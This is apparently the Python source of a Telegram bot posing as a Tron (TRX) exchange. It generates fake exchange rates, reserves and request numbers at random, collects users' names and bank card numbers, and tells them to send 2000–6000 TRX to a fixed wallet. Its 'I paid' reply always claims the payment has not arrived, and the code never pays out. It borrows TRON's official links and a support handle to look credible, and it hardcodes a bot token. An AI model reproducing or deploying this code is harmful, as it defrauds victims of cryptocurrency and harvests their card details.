import logging
from aiogram import Bot, Dispatcher, executor, types
import markups as nav
import random
from aiogram import types

TOKEN = "1795417550:AAH0ZL31ZhnahKRTy1IO-e3o9b7mm8lsF6k"

I18N_DOMAIN = 'testbot'


bot = Bot(token=TOKEN)
dp = Dispatcher(bot)

@dp.message_handler(commands=['start'])
async def command_start(message: types.Message):
        await bot.send_message(message.chat.id,'Hello {0.first_name}! Here you can sell and exchange Tron(TRX) simply, quickly and securely!'.format(message.from_user), reply_markup = nav.mainMenu)

@dp.message_handler()
async def bot_message(message: types.Message):
    if message.text == '🔎 Contacts 📞':
        await bot.send_message(message.chat.id, '  TRON Official Telegram: http://t.me/tronnetworkEN\n\nTron Official site: https://tron.network\n\nUser support: @TRONGuardsupport', reply_markup = nav.Menu)

    elif message.text == 'ℹ Information ℹ':
        await bot.send_message(message.chat.id, 'TRX, one of the most promising cryptocurrencies listed on over 130 exchanges, brings together millions of investors around the world.\n\n'
            'Total Market Capitalization: $5,758.68M\n'
            'Number of Accounts: 27.36M\n'
            'Transaction volume (24 hours): $' + str(random.randint(512, 516)) + 'M\n\n'
            '                 APPLICATION SCENARIOS\n'
            'TRX is widely used in a variety of scenarios including payment, shopping and voting both inside and outside the TRON ecosystem. For example, TRX is supported by Spend credit card and TRON ATM for TRX payment and online transfer.\n\n'
            '                           TECHNOLOGY\n'
            'TRON is one of the largest blockchain operating systems in the world.\nThe high throughput is achieved by improving TPS in TRON, which has outperformed Bitcoin and Ethereum to the level of everyday use.\n\n'
            '                           SCALABILITY\n'
            'Apps are given a wider range of ways to release on TRON due to its scalability and highly efficient smart contract. It can support a huge number of users.\n\n'
            '                      HIGH RELIABILITY\n'
            'A more robust network structure, user asset, intrinsic value, and a higher degree of consensus decentralization lead to an improved reward distribution mechanism.\n\n'
            '                 TRON Official Telegram:\n'
            '               http://t.me/tronnetworkEN\n'
            '                            Official site:\n'
            '                    https://tron.network'
            , reply_markup = nav.Menu)
    
    elif message.text == 'I paid ✅':
        await bot.send_message(message.chat.id, 'Your payment has not yet arrived or has not been sent. Check if a transfer has been made. To do this, go to your Tron wallet and view your transfer history. Support: @TRONGuardsupport' , reply_markup = nav.FinM)

    elif message.text == '/command3':
        await bot.send_message(message.chat.id, 'Hello {0.first_name}! Here you can sell and transfer Tron (TRX) simply, quickly and securely!'.format(message.from_user), reply_markup = nav.mainMenu)

    elif message.text == '⬅️ Main menu':
        await bot.send_message(message.chat.id, 'Select an action:' , reply_markup = nav.mainMenu)

    elif message.text == '/command2':
        await bot.send_message(message.chat.id, 'Select an action:' , reply_markup = nav.mainMenu)

    elif message.text == '/command1':
        await bot.send_message(message.chat.id, 'For questions about the work of the exchanger, please contact support\n@TRONGuardsupport' , reply_markup = nav.Menu)
    
    elif message.text == '💵 Exchange 💵':
        await bot.send_message(message.chat.id, 'Select currency to exchange:', reply_markup = nav.currencyMenu)
    
    elif message.text == '📊 Exchange rate 📊':
        await bot.send_message(message.chat.id, 'Current exchange rate:\n\n'
            '                      USD\n1 Tron(TRX) = 0' + ',' + '0' + str(random.randint(557, 569)) + ' USD' + '\n\n1000 Tron (TRX) = 56'+ ',' + str(random.randint(2, 6)) + ' USD\n_________________________\n\n' +
            '                      CNY\n1 Tron(TRX) = 0' + ',' + str(random.randint(23, 58)) + ' CNY' + '\n\n1000 Tron (TRX) = 363' + ',' + str(random.randint(12, 67)) +  ' CNY\n_________________________\n\n' +
            '                      JPY\n1 Tron(TRX) = 6' + ',' + '0' + str(random.randint(4, 62)) + ' JPY' + '\n\n1000 Tron (TRX) = 6 ' + str(random.randint(611, 698)) + ',' + str(random.randint(13, 62)) + ' JPY\n_________________________\n\n' +
            '                      RUB\n1 Tron(TRX) = 5' + ',' + str(random.randint(65, 88)) + ' RUB' + '\n\n1000 Tron (TRX) = 5 ' + str(random.randint(650, 880)) + ',' + str(random.randint(11, 82)) + ' RUB\n_________________________\n\n' +
            '                      EUR\n1 Tron(TRX) = 0' + ',' + '0' + str(random.randint(3753, 4015)) + ' EUR' + '\n\n1000 Tron (TRX) = 47' + ',' + str(random.randint(536, 603)) + ' EUR\n_________________________\n\n' + 
            '                      KRW\n1 Tron(TRX) = 66' + ',' + str(random.randint(10, 86)) + ' KRW' + '\n\n1000 Tron (TRX) = 66 ' + str(random.randint(200, 890)) + ',' + str(random.randint(10, 35)) + ' KRW', reply_markup = nav.Menu)

    elif message.text == '🏛 Service reserves 🏛':
        await bot.send_message(message.chat.id, 'At the moment, the service reserves are:\n\nUSD: 12 ' + str(random.randint(112, 114)) +' '+ str(random.randint(679, 718)) + ' USD\n\nCNY: 16 ' + str(random.randint(321, 326)) +' '+ str(random.randint(862, 987)) +' CNY\n\nJPY: 22 ' + str(random.randint(224, 228)) +' '+ str(random.randint(123, 164)) +' JPY\n\nRUB: 27 ' + str(random.randint(611, 612)) +' '+ str(random.randint(124, 656)) +' RUB\n\nEUR: 13 ' + str(random.randint(112, 112)) +' '+ str(random.randint(240, 355)) + ' EUR\n\nKRW: 21 ' + str(random.randint(218, 219)) +' '+ str(random.randint(981, 989)) + ' KRW', reply_markup = nav.Menu)
    
    elif message.text == 'USD':
        await bot.send_message(message.chat.id, 'You have chosen to exchange the Tron(TRX) for USD (Visa/Mastercard)\n\nExchange rate:\n1 Tron(TRX) = 0' + ',' + '0' + str(random.randint(557, 569)) + ' USD' + '\nMinimum exchange amount:\n2000 Tron(TRX) = 112'+ ',' + str(random.randint(2, 6)) + ' USD\n\nEnter your name and surname, then enter the details of the bank card to which you want to get money in USD currency.\nThe card number consists of 16 numbers and usually looks like this - 6676 9140 1195 1002\n\nSend the bot your surname, name and your card number and click ' + '"The next step"' + '\n\nIf an incorrect card number is entered, the bot will automatically make a refund', reply_markup = nav.nextMenu)
    
    elif message.text == 'CNY':
        await bot.send_message(message.chat.id, 'You have chosen to exchange the Tron(TRX) for CNY (Visa/Mastercard)\n\nExchange rate:\n1 Tron(TRX) = 0' + ',' + str(random.randint(23, 58)) + ' CNY' + '\nMinimum exchange amount:\n2000 Tron(TRX) = 1080' + ',' + str(random.randint(12, 67)) +  ' CNY\n\nEnter your name and surname, then enter the details of the bank card to which you want to get money in CNY currency.\nThe card number consists of 16 numbers and usually looks like this - 6676 9140 1195 1002\n\nSend the bot your surname, name and your card number and click ' + '"The next step"' + '\n\nIf an incorrect card number is entered, the bot will automatically make a refund', reply_markup = nav.nextMenu)

    elif message.text == 'JPY':
        await bot.send_message(message.chat.id, 'You have chosen to exchange the Tron(TRX) for JPY (Visa/Mastercard)\n\nExchange rate:\n1 Tron(TRX) = 6' + ',' + '0' + str(random.randint(4, 62)) + ' JPY' + '\nMinimum exchange amount:\n2000 Tron(TRX) = 12 ' + str(random.randint(611, 698)) + ',' + str(random.randint(13, 62)) + ' JPY\n\nEnter your name and surname, then enter the details of the bank card to which you want to get money in JPY currency.\nThe card number consists of 16 numbers and usually looks like this - 6676 9140 1195 1002\n\nSend the bot your surname, name and your card number and click ' + '"The next step"' + '\n\nIf an incorrect card number is entered, the bot will automatically make a refund', reply_markup = nav.nextMenu)
    
    elif message.text == 'RUB':
        await bot.send_message(message.chat.id, 'You have chosen to exchange the Tron(TRX) for RUB (Visa/Mastercard)\n\nExchange rate:\n1 Tron(TRX) = 5' + ',' + str(random.randint(65, 88)) + ' RUB' + '\nMinimum exchange amount:\n2000 Tron(TRX) = 10 ' + str(random.randint(650, 880)) + ',' + str(random.randint(11, 82)) + ' RUB\n\nEnter your name and surname, then enter the details of the bank card to which you want to get money in RUB currency.\nThe card number consists of 16 numbers and usually looks like this - 6676 9140 1195 1002\n\nSend the bot your surname, name and your card number and click ' + '"The next step"' + '\n\nIf an incorrect card number is entered, the bot will automatically make a refund', reply_markup = nav.nextMenu)

    elif message.text == 'EUR':
        await bot.send_message(message.chat.id, 'You have chosen to exchange the Tron(TRX) for EUR (Visa/Mastercard)\n\nExchange rate:\n1 Tron(TRX) = 0' + ',' + '0' + str(random.randint(3753, 4015)) + ' EUR' + '\nMinimum exchange amount:\n2000 Tron(TRX) = 77' + ',' + str(random.randint(536, 603)) + ' EUR\n\nEnter your name and surname, then enter the details of the bank card to which you want to get money in EUR currency.\nThe card number consists of 16 numbers and usually looks like this - 6676 9140 1195 1002\n\nSend the bot your surname, name and your card number and click ' + '"The next step"' + '\n\nIf an incorrect card number is entered, the bot will automatically make a refund', reply_markup = nav.nextMenu)

    elif message.text == 'KRW':
        await bot.send_message(message.chat.id, 'You have chosen to exchange the Tron(TRX) for KRW (Visa/Mastercard)\n\nExchange rate:\n1 Tron(TRX) = 66' + ',' + str(random.randint(20, 86)) + ' KRW' + '\nMinimum exchange amount:\n2000 Tron(TRX) = 132 ' + str(random.randint(200, 890)) + ',' + str(random.randint(10, 35)) + ' KRW\n\nEnter your name and surname, then enter the details of the bank card to which you want to get money in KRW currency.\nThe card number consists of 16 numbers and usually looks like this - 6676 9140 1195 1002\n\nSend the bot your surname, name and your card number and click ' + '"The next step"' + '\n\nIf an incorrect card number is entered, the bot will automatically make a refund', reply_markup = nav.nextMenu)

    elif message.text == 'The next step ➡️':
        await bot.send_message(message.chat.id, 'Please, make sure the details you entered are correct and continue.', reply_markup = nav.ContinueMenu)

    elif message.text == 'Continue ➡️':
        await bot.send_message(message.chat.id, 'Select the amount of currency you would like to exchange:\n\nMinimum exchange amount = 2000 Tron(TRX)', reply_markup = nav.TRXMenu)

    elif message.text == '2000 Tron(TRX)':
        await bot.send_message(message.chat.id, 'Exchange request №' + str(random.randint(3767, 6243)) + ' created.✔\n\nYou have chosen: exchange 2000 Tron(TRX). \n\nTransfer 2000 Tron(TRX) to the exchanger wallet sent below. It is not recommended to rewrite the wallet number manually, copy it.\n\nWallet number⬇\n\nTMZvjX3YMJBpbHBop5iL1wke3UuQBYivF1\n\nAfter making the transfer, click "I paid", after which the system will check the availability of the transaction and within 1-5 minutes will transfer the money to the card you specified.', reply_markup = nav.FinalMenu)
    
    elif message.text == '2500 Tron(TRX)':
        await bot.send_message(message.chat.id, 'Exchange request №' + str(random.randint(3767, 6243)) + ' created.✔\n\nYou have chosen: exchange 2500 Tron(TRX).\n\nTransfer 2500 Tron(TRX) to the exchanger wallet sent below. It is not recommended to rewrite the wallet number manually, copy it.\n\nWallet number⬇\n\nTMZvjX3YMJBpbHBop5iL1wke3UuQBYivF1\n\nAfter making the transfer, click "I paid", after which the system will check the availability of the transaction and within 1-5 minutes will transfer the money to the card you specified.', reply_markup = nav.FinalMenu)

    elif message.text == '3000 Tron(TRX)':
        await bot.send_message(message.chat.id, 'Exchange request №' + str(random.randint(3667, 6243)) + ' created.✔\n\nYou have chosen: exchange 3000 Tron(TRX).\n\nTransfer 3000 Tron(TRX) to the exchanger wallet sent below. It is not recommended to rewrite the wallet number manually, copy it.\n\nWallet number⬇\n\nTMZvjX3YMJBpbHBop5iL1wke3UuQBYivF1\n\nAfter making the transfer, click "I paid", after which the system will check the availability of the transaction and within 1-5 minutes will transfer the money to the card you specified.', reply_markup = nav.FinalMenu)
    
    elif message.text == '3500 Tron(TRX)':
        await bot.send_message(message.chat.id, 'Exchange request №' + str(random.randint(3767, 6243)) + ' created.✔\n\nYou have chosen: exchange 3500 Tron(TRX).\n\nTransfer 3500 Tron(TRX) to the exchanger wallet sent below. It is not recommended to rewrite the wallet number manually, copy it.\n\nWallet number⬇\n\nTMZvjX3YMJBpbHBop5iL1wke3UuQBYivF1\n\nAfter making the transfer, click "I paid", after which the system will check the availability of the transaction and within 1-5 minutes will transfer the money to the card you specified.', reply_markup = nav.FinalMenu)

    elif message.text == '4000 Tron(TRX)':
        await bot.send_message(message.chat.id, 'Exchange request №' + str(random.randint(3767, 6243)) + ' created.✔\n\nYou have chosen: exchange 4000 Tron(TRX).\n\nTransfer 4000 Tron(TRX) to the exchanger wallet sent below. It is not recommended to rewrite the wallet number manually, copy it.\n\nWallet number⬇\n\nTMZvjX3YMJBpbHBop5iL1wke3UuQBYivF1\n\nAfter making the transfer, click "I paid", after which the system will check the availability of the transaction and within 1-5 minutes will transfer the money to the card you specified.', reply_markup = nav.FinalMenu)

    elif message.text == '4500 Tron(TRX)':
        await bot.send_message(message.chat.id, 'Exchange request №' + str(random.randint(3767, 6243)) + ' created.✔\n\nYou have chosen: exchange 4500 Tron(TRX).\n\nTransfer 4500 Tron(TRX) to the exchanger wallet sent below. It is not recommended to rewrite the wallet number manually, copy it.\n\nWallet number⬇\n\nTMZvjX3YMJBpbHBop5iL1wke3UuQBYivF1\n\nAfter making the transfer, click "I paid", after which the system will check the availability of the transaction and within 1-5 minutes will transfer the money to the card you specified.', reply_markup = nav.FinalMenu)
    
    elif message.text == '5000 Tron(TRX)':
        await bot.send_message(message.chat.id, 'Exchange request №' + str(random.randint(3767, 6243)) + ' created.✔\n\nYou have chosen: exchange 5000 Tron(TRX).\n\nTransfer 5000 Tron(TRX) to the exchanger wallet sent below. It is not recommended to rewrite the wallet number manually, copy it.\n\nWallet number⬇\n\nTMZvjX3YMJBpbHBop5iL1wke3UuQBYivF1\n\nAfter making the transfer, click "I paid", after which the system will check the availability of the transaction and within 1-5 minutes will transfer the money to the card you specified.', reply_markup = nav.FinalMenu)
    
    elif message.text == '5500 Tron(TRX)':
        await bot.send_message(message.chat.id, 'Exchange request №' + str(random.randint(3767, 6243)) + ' created.✔\n\nYou have chosen: exchange 5500 Tron(TRX).\n\nTransfer 5500 Tron(TRX) to the exchanger wallet sent below. It is not recommended to rewrite the wallet number manually, copy it.\n\nWallet number⬇\n\nTMZvjX3YMJBpbHBop5iL1wke3UuQBYivF1\n\nAfter making the transfer, click "I paid", after which the system will check the availability of the transaction and within 1-5 minutes will transfer the money to the card you specified.', reply_markup = nav.FinalMenu)
    
    elif message.text == '6000 Tron(TRX)':
        await bot.send_message(message.chat.id, 'Exchange request №' + str(random.randint(3767, 6243)) + ' created.✔\n\nYou have chosen: exchange 6000 Tron(TRX).\n\nTransfer 6000 Tron(TRX) to the exchanger wallet sent below. It is not recommended to rewrite the wallet number manually, copy it.\n\nWallet number⬇\n\nTMZvjX3YMJBpbHBop5iL1wke3UuQBYivF1\n\nAfter making the transfer, click "I paid", after which the system will check the availability of the transaction and within 1-5 minutes will transfer the money to the card you specified.', reply_markup = nav.FinalMenu)         



if __name__ == '__main__':
    executor.start_polling(dp, skip_updates = True)